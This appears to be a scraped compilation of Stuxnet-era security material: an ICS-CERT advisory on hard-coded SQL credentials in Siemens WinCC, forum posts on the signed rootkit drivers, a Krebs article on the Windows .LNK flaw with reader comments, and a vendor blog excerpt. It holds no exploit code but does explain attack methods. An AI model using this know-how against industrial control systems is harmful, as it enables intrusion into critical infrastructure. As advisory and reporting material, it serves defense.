ICS Advisory
# Siemens WinCC Insecure SQL Server Authentication

Last RevisedMay 08, 2013
Alert CodeICSA-12-205-01

## Overview

Siemens has released a software update for an insecure SQL server authentication vulnerability in Siemens’ SIMATIC WinCC and SIMATIC PCS 7 software. Previous versions of SIMATIC WinCC use default SQL server credentials that allowed administrative access to the database. The default credentials cannot be changed or disabled. This vulnerability can be remotely exploited, as was the case with Stuxnet malware which was known to target this vulnerability. Siemens has produced an updated version that resolves the reported vulnerability.

*Note*: This advisory, together with advisory “[ICSA-12-205-02—Siemens SIMATIC STEP 7 DLL Vulnerability](/control_systems/pdf/ICSA-12-205-02.pdf),” addresses vulnerabilities first discovered in 2010 in conjunction with the discovery of Stuxnet. This vulnerability was fixed in 2010 by Siemens through a security update.

## Affected Products

The following SIMATIC WinCC versions are affected:

* SIMATIC WinCC versions older than V7.0 SP2 Update 1 (V 7.0.2.1), and
* SIMATIC PCS 7 versions older than V7.1 SP2.

## Impact

This vulnerability allows an attacker to gain unauthorized access by using the default credentials to read from or write to files and settings on the target system.

Impact to individual organizations depends on many factors that are unique to each organization. ICS-CERT recommends that organizations evaluate the impact of this vulnerability based on their operational environment, architecture, and product implementation.

## Background

Siemens SIMATIC WinCC is a software package used as an interface between the operator and the programmable logic controllers (PLCs) controlling the process. SIMATIC WinCC performs the following tasks: process visualization, operator control of the process, alarm display, process value and alarm archiving, and machine parameter management. This software is used in many industries, including food and beverage, water and wastewater, oil and gas, and chemical.

## Vulnerability Characterization

### Vulnerability Overview

#### Use of Default CredentialsCWE-798: Use of Hard-Coded Credentials, http://cwe.mitre.org/data/definitions/798.html, Web site last accessed July 23, 2012.

The SIMATIC WinCC server uses default credentials for its SQL server database. An attacker can use these credentials to gain administrative access to the database server, allowing data reads and writes. The SIMATIC WinCC default credentials cannot be changed or disabled by users.

[CVE-2010-2772](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-2772) has been assigned to this vulnerability. A CVSS v2 base score of 10.0 has been assigned; the CVSS vector string is [(AV:N/AC:L/Au:N/C:C/I:C/A:C)](http://nvd.nist.gov/cvss.cfm?adv&name=&vector=(AV:N/AC:L/Au:N/C:C/I:C/A:C)&version=2,).

### Vulnerability Details

#### Exploitability

This vulnerability can be remotely exploited.

#### Existence of Exploit

Malware and public exploits are known to target this vulnerability.

#### Difficulty

An attacker with a low skill level would be able to exploit these vulnerabilities.

## Mitigation

Siemens has addressed this vulnerability in SIMATIC WinCC V7.0 SP2 Update 1 (V 7.0.2.1) and newer. The latest software update, V7.0 SP3 Update 2, is provided at the Siemens product update page.e Siemens recommends that SIMATIC PCS 7 users should apply this update. The updated version removes the default credentials and switches authentication mechanisms to Windows protocols. Siemens strongly encourages installing the software updates as soon as possible. For further information please review Siemens Security Advisory (SSA-027884), which can be found at the [Siemens ProductCERT website](http://Siemens ProductCERT Advisories, http://www.siemens.com/corporate-technology/en/research-areas/siemens-cert-security-advisories.htm).

ICS-CERT encourages asset owners to take additional defensive measures to protect against this and other cybersecurity risks.

* Minimize network exposure for all control system devices. Critical devices should not directly face the Internet.
* Locate control system networks and remote devices behind firewalls, and isolate them from the business network.
* When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected devices.

The Control Systems Security Program (CSSP) also provides a section for control systems security recommended practices on the CSSP Web page. Several recommended practices are available for reading and download, including [*Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies*](/control_systems/practices/Recommended_Practices.html%2C). ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive measures.

Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to ICS-CERT for tracking and correlation against other incidents.

   > Modules of current malware were first time detected by "VirusBlokAda" (<http://anti-virus.by/en/>) company specialists on the 17th of June, 2010 and were added to the anti-virus bases as **Trojan-Spy.0485** and **Malware-Cryptor.Win32.Inject.gen.2**. During the analysis of malware there was revealed that it uses USB storage device for propagation.

   > Malware installs two drivers: mrxnet.sys and mrxcls.sys. They are used to inject code into systems processes and hide malware itself. That's the reason why you can't see malware files on the infected USB storage device. We have added those drivers to anti-virus bases as **Rootkit.TmpHider** and **SScope.Rookit.TmpHider.2**. Note that both drivers are signed with digital signature of Realtek Semiconductor Corp. ([www.realtek.com](http://www.realtek.com)).

   > I don't recall any expert saying "this" was impossible. It's always been possible to steal a legit certificate, if whoever owns that cert has lax enough security. It's possible to slap any cert on a file and at a glance it may look legit, but won't actually check out as valid *if* one bothers to check. There are possibilities like this - there's always even the option of fooling the certificate authority into issueing you a certificate that should belong to someone else (you're not Mozilla Corporation, but some CA might still give you a certificate with that name on it). In this particular case, there's not much information to go on to tell what's actually happened.

   > There seems to be some confusion here, due to the vagueness of some statements. None of those comments you quoted claims that it's impossible to have a (valid) digital signature on a malicious file. There's plenty of ways for that: for example, one could steal a cert from some innocent developer and then use it to sign malware. There's even more ways to get an invalid digital signature on a malware: for example, just copying it from some signed file. What those comments you quoted *are* saying is that it's not mathematically feasible to create a "fake" digital signature that also checks out as valid in someone else's name. When "so called experts" claim digital signatures can't be faked, they're referring to this mathematical difficulty of creating a fake signature that actually checks out as valid. They're not saying you can't steal a cert from someone, or fool a certificate authority into granting you someone else's cert, or such things.

Was a legit Realtek cert stolen? Or is it just a case of copying the cert onto a malware binary, in which case the signature would check out as invalid? Or is it really a case where someone has successfully created a fake cert that checks out as valid, in spite of the mathematical difficulty of this? With the scarce information given here, it's impossible to tell, but the latter is very unlikely. Sure, there's the option of exploiting MD5 collisions, but even though that's theoretically possible, it's not exactly easy, and it's not like you have to use MD5 anyway. What I'm saying here is that the information given in this thread gives us no reason to suspect those "experts" were wrong about the mathematical infeasibility of creating fake digital signatures.

It would be nice to know more details on the .LNK file vulnerability, for example, and details on the digital signature on the malicious files, and many other factors. When one leaves such information out, it feels kind of like a movie teaser trailer - all the good stuff is missing. ![:D](styles/default/xenforo/clear.png "Big Grin    :D")

    > Thanks for that ![:thumb:](styles/default/xenforo/clear.png "Thumbs Up    :thumb:") There's still some questions about the .LNK file vulnerability worth asking, though. Such as: Has the vulnerability been reported to Microsoft? And most importantly the nature of the vulnerability. I assume it leads to arbitrary code execution with the privileges of explorer.exe (the privileges of currently logged-in user, that is to say)? If that is so, then the malware wouldn't be able to infect a system unless the user was logged in as an administrator. It would be nice for such details to be mentioned, seeing how it has a great effect on how dangerous the vulnerability is, especially considering that new Windows versions come with UAC enabled by default.

    > No, I don't see how it could. According to Sergey's PDF, the malware infects the system by exploiting an unpatched vulnerability in processing LNK files. There is no mention of any other vulnerability being exploited. Those .pnf files are not graphic files - as stated in the PDF, they're encrypted. They probably contain things like the malware's configuration data.

# Experts Warn of New Windows Shortcut Flaw

July 15, 2010

[91 Comments](https://krebsonsecurity.com/2010/07/experts-warn-of-new-windows-shortcut-flaw/#comments)

Researchers have discovered a sophisticated new strain of malicious software that piggybacks on USB storage devices and leverages what appears to be a previously unknown security vulnerability in the way **Microsoft Windows** processes shortcut files.

**[![](https://krebsonsecurity.com/wp-content/uploads/2010/07/usbday-300x225.jpg "usbday")](https://krebsonsecurity.com/wp-content/uploads/2010/07/usbday.jpg)**

**Update, July 16,  7:49 p.m. ET:** Microsoft just released an advisory about this flaw, available [here](http://microsoft.com/technet/security/advisory/2286198.mspx). Microsoft said it stems from a vulnerability in the “Windows shell” (Windows Explorer, e.g.) that is present in every supported version of Windows. The advisory includes steps that can mitigate the threat from this flaw.

*Original post:*

**VirusBlokAda**, an anti-virus company based in Belarus, said that on June 17 its specialists found two new malware samples that were capable of infecting a fully-patched **Windows 7** system if a user were to view the contents of an infected USB drive with a common file manager such as Windows Explorer.

USB-borne malware is extremely common, and most malware that propagates via USB and other removable drives traditionally has taken advantage of the Windows Autorun or Autoplay feature. But according to VirusBlokAda, this strain of malware leverages a vulnerability in the method Windows uses for handling shortcut files.

Shortcut files — or those ending in the “.lnk” extension — are Windows files that link (hence the “lnk” extension) easy-to-recognize icons to specific executable programs, and are typically placed on the user’s Desktop or Start Menu. Ideally, a shortcut doesn’t do anything until a user clicks on its icon. But VirusBlokAda found that these malicious shortcut files are capable of executing automatically if they are written to a USB drive that is later accessed by Windows Explorer.

“So you just have to open infected USB storage device using [Windows] Explorer or any other file manager which can display icons (for i.e. Total Commander) to infect your Operating System and allow execution of the malware,” wrote **Sergey Ulasen**, an anti-virus expert with the company, in [an advisory](http://anti-virus.by/en/tempo.shtml) published this month.

Ulasen said the malware installs two drivers: “[mrxnet.sys](http://www.virustotal.com/ru/analisis/9c891edb5da763398969b6aaa86a5d46971bd28a455b20c2067cb512c9f9a0f8-1278584177)” and “[mrxcls.sys](http://www.virustotal.com/ru/analisis/d58c95a68ae3debf9eedb3497b086c9d9289bc5692b72931f3a12c3041832628-1278584115).” These so-called “rootkit” files are used to  hide the malware itself so that it remains invisible on the USB storage device. Interestingly, Ulasen notes that both driver files are signed with the digital signature of [Realtek Semiconductor Corp](http://www.realtek.com)., a legitimate hi-tech company.

Ulasen said he reached out to Microsoft and to Realtek but got a response from neither. **Jerry Bryant**, group manager of response communications at Microsoft, told KrebsOnSecurity.com Wednesday that “Microsoft is investigating new public claims of malware propagating via USB storage devices. When we have completed our investigations we will take appropriate action to protect users and the Internet ecosystem.”

If this truly is a new vulnerability in Windows, it could soon become a popular method for spreading malware. But for now, this threat seems fairly targeted: Independent security researcher [Frank Boldewin](http://www.reconstructer.org/) said he had an opportunity to dissect the malware samples, and observed that they appeared to be looking for [Siemens WinCC SCADA systems](http://www.sea.siemens.com/us/News/Industrial/Pages/SIEMENS-WinCC-SCADA-SOFTWARE-NOW-SUPPORTS-WINDOWS-VISTA.aspx), or machines responsible for controlling the operations of large, distributed systems, such as manufacturing and power plants.

“Looks like this malware was made for espionage,” Boldewin said.

   Brian,

   Could this vulnerability be attacked through a website drive by? If it is all based on Windows proccessing the malicious LNK file could an attacker not setup a script to download the file to the user’s machine when they visited the site. Then once Windows proccess the LNK file it would try and execute its payload? Also, what about sending the malicious LNK files out as part of an email?

   Thanks

   I am SO TIRED of nothing working on Vista which was NEW, and finding more and more problems, and sites like this find a flaw. HOW ABOUT A LINK OR D/L TO FIX IT? FOR ONE THING EVEN

   Disgusted Blogs, bulletins, warnings but not ONE PLACE to tell you what to do or a fix. Flaw in links, Power grid, certificates, etc, al l mentioned do you think that the average person has the TIME or KNOWLEDGE to know where to go or how to fix it. A Microsoft Bulletin, Great. No fix though.

      Bea- Check out my latest post. It includes a fix-it tool.

         Thanks for that SOPHOS link Brian! That tool will really do the trick if Sophos claims are correct. It will provide a pop-up to tell you critical shortcut files are attempting to be changed.

         After installation my icons went blank, but popped back automatically after coming out of standby!

   Regarding the Siemens WinCC SCADA sw trojan, why not block execution of mrxnet.sys & mrxctl.sys via registry to mitigate spread? See Marcelo Fartura’s blog <http://goo.gl/kK0Z>

    OMG! Thanks for sharing it. Its the first time I heard about this treat.

    Thanks to the fix tool too.

    I have all my defenses patched up. how it will do it.

    Cool shortcuts, very useful. Thanks a bunch!!! I found a few move shortcuts here: <http://www.usingcomputers.co.uk/tutorials/useful-windows-shortcuts.php> its worth taking a look at combined with this article. Thanks, keep up the good posts!

    Very Cool Brian! I just read the April 2011 Vanity Fair article giving you credit for the first publication of Stuxnet, which this turned out to be. Just noticed that in Serjey’s comment though at the time it never hit me when I read your blog.

    Keep up the great work,

       Thanks, Curt. My biggest regret with that story is not knowing it would be called “Stuxnet” and including that in the headline! At the time, it looked like yet another Windows 0day, albeit with a potentially interesting twist.

       The Vanity Fair article is here:

The shortcut file used in this case is 4.1 KB. Files associated with the trojan-dropper, backdoor, rootkit are detected as the Stuxnet family.We mentioned two interesting details yesterday, that the rootkit was signed, and that it was targeting SCADA systems.The rootkit components are digital signed and we've confirmed that a valid Realtek Semiconductor Corp. signature is used. The dropped drivers are properly signed, while the trojan-dropper itself only attempted to copy the digital signature.In any case, the certificate, while valid, expired in June. The H Security has [a screenshot of the certificate](https://www.h-online.com/security/news/item/Trojan-spreads-via-new-Windows-hole-1038992.html).Malicious software using valid digital signatures is something that our Jarno Niemel� recently predicted in his [Caro 2010 Workshop](https://caro2010.org/) presentation: It's Signed, therefore it's Clean, right?Regarding the SCADA systems that are being targeted, **the Siemens SIMATIC WinCC database appears to use a hardcoded admin username and password combination that end users are told not to change**.Thus, any organization successfully compromised by this targeted attack could be completely vulnerable to database compromise. This Slashdot comment [has additional details](https://it.slashdot.org/comments.pl?sid=1721020&cid=32920758).We'll have more on this case as it develops.**Edited to add**: While the certificate used for signing has expired, noted above, because a countersigning technique to time stamp is used, it is still possible that the certificate can be utilized.From Microsoft's [MSDN Library](https://msdn.microsoft.com/en-us/library/bb931395%28VS.85%29.aspx): "The countersignature method of time stamping … allows for signatures to be verified even after the signing certificate has expired or been revoked." | | --- | --- | --- | --- | --- | --- | --- | --- | |
